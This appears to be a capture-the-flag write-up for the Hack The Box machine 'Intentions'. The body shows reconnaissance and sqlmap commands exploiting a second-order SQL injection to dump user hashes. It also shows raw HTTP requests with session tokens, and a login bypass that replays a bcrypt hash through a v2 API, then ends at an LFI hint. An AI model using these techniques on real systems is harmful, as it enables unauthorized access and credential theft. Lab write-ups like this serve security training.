## HTB Intentions (Hard) - Writeup

Difficulty: Hard

I found an admin API in admin.js and noticed bcrypt hashes were sent from the client, allowing me to reuse a hash to log in as admin.  
I exploited a vulnerable ImageMagick setup by sending an .msl file with the vid: scheme, achieving RCE and triggering a reverse shell.  
For privilege escalation, I found a .git folder, recovered it, and identified credentials from a past commit to SSH in as greg.  
To escalate to root, I abused a custom scanner binary with the cap_dac_read_search capability to read restricted files like /etc/shadow by bruteforcing contents based on MD5 hashes.   

---

## Nmap 

#### The nmap scan revealed two open ports:

![obraz](https://github.com/user-attachments/assets/1d6dec87-491a-4280-99a6-79199336240e)


## Port 80 - Website  

Website welcomes us with login/register page:  

![obraz](https://github.com/user-attachments/assets/53d471e0-30f7-467d-8411-c3fb843ab875)

We'll register an account:  

![obraz](https://github.com/user-attachments/assets/14bf2538-e552-42f6-a51f-f39f77fe8583)

We can change feed on this website which might be injectable, we'll leave it for now.  
Now let's run feroxbuster:  

![obraz](https://github.com/user-attachments/assets/938cba60-4fae-4b2b-b262-ce304aa79568)

It has found /admin.js, let's check it:  

![obraz](https://github.com/user-attachments/assets/3bafb16a-aaaf-4ac7-b9bc-ae0ac7568256)

At the bottom of the file we have found a message:  

![obraz](https://github.com/user-attachments/assets/ccd4d9bb-4b22-4b8d-9097-97320c00f98b)

```
Hey team, I’ve deployed the v2 API to production and have started using it in the admin section. Let me know if you spot any bugs.
This will be a major security upgrade for our users, passwords no longer need to be transmitted to the server in clear text!
By hashing the password client side there is no risk to our users as BCrypt is basically uncrackable.
This should take care of the concerns raised by our users regarding our lack of HTTPS connection.
The v2 API also comes with some neat features we are testing that could allow users to apply cool effects to the images.
I’ve included some examples on the image editing page, but feel free to browse all of the available effects for the module and suggest some.
```

Api name can also be found here:  
+  /api/v2/admin/users




## SQL injection into feed

Let's come back to update feed option, it allows us to input comma separated categories like: nature,food, etc.  
It's worth to note that spaces get deleted when we update the favourite feed.  

In order to run sqlmap we need two requst.  
The first one is updating favourite categories:  
```
POST /api/v1/gallery/user/genres HTTP/1.1
Host: 10.10.11.220
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: application/json
X-XSRF-TOKEN: eyJpdiI6IkhiTGtTQXlFNHJ6SkEvTGRacEpKYUE9PSIsInZhbHVlIjoia2oyWjZ2Y1hic1ZTQzY3d2luYVN0UnhHU3k4azVBejJhamNaaXpCR2ljelY1NVhoYWxrUDJqc3pibWhCYkJTU0E2QXBWN2VaTE1ndE55QnlVV0RUa0hRMGJrMEVIeGFhbG41TmcrcVcvM2E0SnZUbWpzdnhqUVRFSzVnL3ZuS00iLCJtYWMiOiIxMzQ0MTVkOTQ1ZTIwYjA5NGY2MDdjNjA5NmRjZWVhMjQ1Yjc0ZDFkMWY3MTUyZmFkNGEwOTRiMzAwYzlkZmYzIiwidGFnIjoiIn0=
Content-Length: 17
Origin: http://10.10.11.220
Connection: keep-alive
Referer: http://10.10.11.220/gallery
Cookie: XSRF-TOKEN=eyJpdiI6IkhiTGtTQXlFNHJ6SkEvTGRacEpKYUE9PSIsInZhbHVlIjoia2oyWjZ2Y1hic1ZTQzY3d2luYVN0UnhHU3k4azVBejJhamNaaXpCR2ljelY1NVhoYWxrUDJqc3pibWhCYkJTU0E2QXBWN2VaTE1ndE55QnlVV0RUa0hRMGJrMEVIeGFhbG41TmcrcVcvM2E0SnZUbWpzdnhqUVRFSzVnL3ZuS00iLCJtYWMiOiIxMzQ0MTVkOTQ1ZTIwYjA5NGY2MDdjNjA5NmRjZWVhMjQ1Yjc0ZDFkMWY3MTUyZmFkNGEwOTRiMzAwYzlkZmYzIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6ImlMbXVEb3lZek90MGFTaUY5bVFBb3c9PSIsInZhbHVlIjoicUxZRmlkS3FucHhjNTY3dVYvOVBiek1RZlZXSXZmVjJrQTRFUFR4OEtYU2VodGRPUG5hQzFDZ0lSaFgvb2FTMmZsYkRmVy96OC9ENFA0RmUzQjdFcVprdHhGOWFiaWZ3bGl6RVN2SVpTb1JGbWt4ZkJYL1drOGFobE1jMXN5cG4iLCJtYWMiOiJkMmRkM2I3MGYwNWQ0OGEwZDIxMDY1YjFjYjMzNWUxZTliZTM5ODdiODgyYTc4N2JlMTBmNTY2MzI3MGE0ZTk3IiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92MS9hdXRoL2xvZ2luIiwiaWF0IjoxNzUwNTkwMDEwLCJleHAiOjE3NTA2MTE2MTAsIm5iZiI6MTc1MDU5MDAxMCwianRpIjoiUnpid0k1REFCMTM4czVnNyIsInN1YiI6IjI4IiwicHJ2IjoiMjNiZDVjODk0OWY2MDBhZGIzOWU3MDFjNDAwODcyZGI3YTU5NzZmNyJ9.9L-7_Ar3zgUMwPu8dz3lepl-WhBuMH9DoMGwW9BVAiM
Priority: u=0

{"genres":"test"}
```

We'll save it to a file.  
The second request is looking at the feed:  
```
GET /api/v1/gallery/user/feed HTTP/1.1
Host: 10.10.11.220
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
X-XSRF-TOKEN: eyJpdiI6Ilc1Mkx2QUxCTWh3emdXc1plckcwUkE9PSIsInZhbHVlIjoieUJtNXp3ZGRrNHR6bnpmaEdNUWJaVHNyRG93SDZIQXFsMC9FYWg3WVdSZSt6NmJxcmhSRThWYjRTaHNQTExTZy9TU2R0UGM3UlI2YW9Lb2FPY2ZGbXlkTUQ0WGhVOFNVNXMvS1ZyRCtNZGtXbEpUSHlEQ05tU09NQUFta29MY3YiLCJtYWMiOiJjZWQ0N2FiMDBiNTZhZDAxYzhhYjZjMzY5NDFiZmYxZDUyOTY0YmE5NzYwM2JhYWE5YTdjMDM5NmQ5M2QwMGJiIiwidGFnIjoiIn0=
Connection: keep-alive
Referer: http://10.10.11.220/gallery
Cookie: XSRF-TOKEN=eyJpdiI6Ilc1Mkx2QUxCTWh3emdXc1plckcwUkE9PSIsInZhbHVlIjoieUJtNXp3ZGRrNHR6bnpmaEdNUWJaVHNyRG93SDZIQXFsMC9FYWg3WVdSZSt6NmJxcmhSRThWYjRTaHNQTExTZy9TU2R0UGM3UlI2YW9Lb2FPY2ZGbXlkTUQ0WGhVOFNVNXMvS1ZyRCtNZGtXbEpUSHlEQ05tU09NQUFta29MY3YiLCJtYWMiOiJjZWQ0N2FiMDBiNTZhZDAxYzhhYjZjMzY5NDFiZmYxZDUyOTY0YmE5NzYwM2JhYWE5YTdjMDM5NmQ5M2QwMGJiIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6InZ6dlFSNEtvUklPVjVnVFYvZGNBaWc9PSIsInZhbHVlIjoiUTNEWi9rYVh4cjhjTXpQN3c5NkdMT0JGcXdmdUNpU1FiUzQzTlRpYVNMMDhGSGNHUmlzT3hrYjU4SklHSFpFUEFpTjl2eVpoNzFiM0JTb241Q3BKNDA1N0xoczNRR0REcTRCSG0rRjV6elhvOWFWWUtFMlFFMFgyaXd3MkQxVzgiLCJtYWMiOiJjY2QwMzg0OTFmNDAzZjdmMjQ3ODM0NjAzNjA0OTU5ZGYyZTNjNjU5ZDhhNmQ4YWRkMjBlMTk4ODIxMTM5ZTJmIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92MS9hdXRoL2xvZ2luIiwiaWF0IjoxNzUwNTkwMDEwLCJleHAiOjE3NTA2MTE2MTAsIm5iZiI6MTc1MDU5MDAxMCwianRpIjoiUnpid0k1REFCMTM4czVnNyIsInN1YiI6IjI4IiwicHJ2IjoiMjNiZDVjODk0OWY2MDBhZGIzOWU3MDFjNDAwODcyZGI3YTU5NzZmNyJ9.9L-7_Ar3zgUMwPu8dz3lepl-WhBuMH9DoMGwW9BVAiM
Priority: u=0
```

Now we can use those two to run sqlmap:  
```
sqlmap -r req.txt --second-req=secondreq.txt --batch --tamper=space2comment
```
tamper flag was used becasuse spaces get deleted.  
This flag just replaces spaces with block comments  /**/  

![obraz](https://github.com/user-attachments/assets/d16d655d-d58d-4299-943f-48adc5a42610)

It appeared to be injectable:  

![obraz](https://github.com/user-attachments/assets/c3d00234-68f9-4ce0-afd9-e73b76a40fe4)

Now we want to retrieve all of the tables,databases, etc.  
```
sqlmap -r req.txt --second-req=secondreq.txt --batch --tamper=space2comment --tables
```

Then dump users:  
```
sqlmap -r req.txt --second-req=secondreq.txt --batch --tamper=space2comment -T users --dump
```

![obraz](https://github.com/user-attachments/assets/a5203153-5f52-494d-b374-eca52529d794)

As a result we got two uncrackable hashes.  




## Abusing API  

We have to take a different apporach.  
Everything we do on the site is going through api v1, but we know that there is an api v2.  
We want to play with login request, we need to catch it with burpsuite, I'll paste it here:  
```
POST /api/v1/auth/login HTTP/1.1
Host: 10.10.11.220
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: application/json
X-XSRF-TOKEN: eyJpdiI6IjhjMGpaWTB6dm9mdmMwUEU5YWJObnc9PSIsInZhbHVlIjoiYmxTZUZQeERKa0cvUGlRNXh3UUt2M28rcjhWUGl5SHBZaDNkS3ZYR0tDSURKNG1SYkNFWjlBMXN2TXZSRzdOYS9pOGRxblNzdkJhRll6VEhHMkpMY2RZd3ZQZC8xSW1rTzVsNDcxQnhQV3lVUGlOajloVXB3TFdIVkU3VnNDSFYiLCJtYWMiOiJkNGVmZjlhNTBiOWM1NTE1MWY2ZjcwYTgxMzkwNjc5ZDE1Y2QzY2Q1OGU3YmUwNzg1ZmFkMWM5MWU3NjMwNzBmIiwidGFnIjoiIn0=
Content-Length: 43
Origin: http://10.10.11.220
Connection: keep-alive
Referer: http://10.10.11.220/
Cookie: XSRF-TOKEN=eyJpdiI6IjhjMGpaWTB6dm9mdmMwUEU5YWJObnc9PSIsInZhbHVlIjoiYmxTZUZQeERKa0cvUGlRNXh3UUt2M28rcjhWUGl5SHBZaDNkS3ZYR0tDSURKNG1SYkNFWjlBMXN2TXZSRzdOYS9pOGRxblNzdkJhRll6VEhHMkpMY2RZd3ZQZC8xSW1rTzVsNDcxQnhQV3lVUGlOajloVXB3TFdIVkU3VnNDSFYiLCJtYWMiOiJkNGVmZjlhNTBiOWM1NTE1MWY2ZjcwYTgxMzkwNjc5ZDE1Y2QzY2Q1OGU3YmUwNzg1ZmFkMWM5MWU3NjMwNzBmIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6ImZHM2Z5Z2Qxd2Q4YWtReDFnbDQ0UXc9PSIsInZhbHVlIjoiTE02RUxXR3RSMENzZDYzMWZIV3NXWm11R1FYY3F4WVNiMnlMY29ueDJ6Zy9RNWprbVE5SWZhbUtHUUJiUUJOWjlGTHlmS29KRjhzUk45L0pMdWNWSzJYMTBjd0dkOFM1ZzBzY3F0Z24yaHBSSHVpb0ZPNG1rbUsxQkZDR0NUZnciLCJtYWMiOiIwZGFjZWRhYzNiY2I5MDQwMGZhMjIzYzgwZWRkNzM0ZmFhNjU3MWJkNjIzOGU1ZmZkYzdhMDljMGZlZmExNDA3IiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92MS9hdXRoL2xvZ2luIiwiaWF0IjoxNzUwNTkwMDEwLCJleHAiOjE3NTA2MTE2MTAsIm5iZiI6MTc1MDU5MDAxMCwianRpIjoiUnpid0k1REFCMTM4czVnNyIsInN1YiI6IjI4IiwicHJ2IjoiMjNiZDVjODk0OWY2MDBhZGIzOWU3MDFjNDAwODcyZGI3YTU5NzZmNyJ9.9L-7_Ar3zgUMwPu8dz3lepl-WhBuMH9DoMGwW9BVAiM
Priority: u=0

{
"email":"test@test.com",
"password":"test"
}
```

![obraz](https://github.com/user-attachments/assets/a5169dfa-35bb-469e-9381-b671b13f7b00)

If we change it to v2 instead of v1 we get a different response:  

![obraz](https://github.com/user-attachments/assets/d0eaef9f-256a-45b0-b649-52fe633341cb)

Replace the password field with a hash field, then add the hash we obtained earlier along with a valid email.   

![obraz](https://github.com/user-attachments/assets/d3df3faa-a979-4b9d-9206-39315f9f0af0)

Now it works, we get a success as response.  
Now just intercept the request again, change the password field to hash, update the email to Greg's, switch the form version from v1 to v2, and click 'Forward' in Burp.  




## Logged in as admin  

Now we can access /admin directory.  

![obraz](https://github.com/user-attachments/assets/4556cb90-c30c-4db7-a197-844a94995e14)

The news page gives us some additional information:  
```
The v2 API also comes with some neat features we are testing that could allow users to apply cool effects to the images.
I've included some examples on the image editing page, but feel free to browse all of the available effects for the module and suggest some: Image Feature Reference
```
The last item is a link, let's follow it.  
It's a link to image magick php.  

![obraz](https://github.com/user-attachments/assets/26721464-d19b-4f5d-902e-b41801c79bcf)

We can modify photos in images -> edit
Intercept this request with burp:  

![obraz](https://github.com/user-attachments/assets/bc83286a-d6e0-4899-9f53-0c71c2f9459d)

It contains two parameters - path and effect.  
Whemever we see something like path it's always a good idea to check for LFI. 











































































